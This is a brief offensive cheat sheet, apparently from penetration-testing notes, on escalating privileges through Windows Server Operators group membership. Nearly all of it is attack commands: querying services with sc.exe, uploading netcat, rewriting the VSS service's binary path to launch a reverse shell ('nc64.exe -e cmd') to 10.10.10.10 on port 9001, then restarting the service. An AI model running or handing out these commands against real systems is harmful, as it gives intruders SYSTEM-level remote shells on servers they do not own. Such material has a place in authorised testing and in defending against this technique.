# Server Operators Group
-------

https://cube0x0.github.io/Pocing-Beyond-DA/

Get a list of services that the account can modify:
```
sc.exe query
```

If the user does not have access to the Service Control Manager proceed to this blindly may be it will work

- Upload a nc binary, change the executable path of the service to the location of the nc binary.

```
sc.exe config VSS binpath="C:\Windows\Tasks\nc64.exe -e cmd 10.10.10.10 9001"
```

```
sc.exe config VSS binpath="C:\Windows\System32\cmd.exe /c C:\Windows\Tasks\nc.exe 10.10.10.10 9001 -e cmd.exe"
```

```
sc.exe stop VSS

sc.exe start VSS
```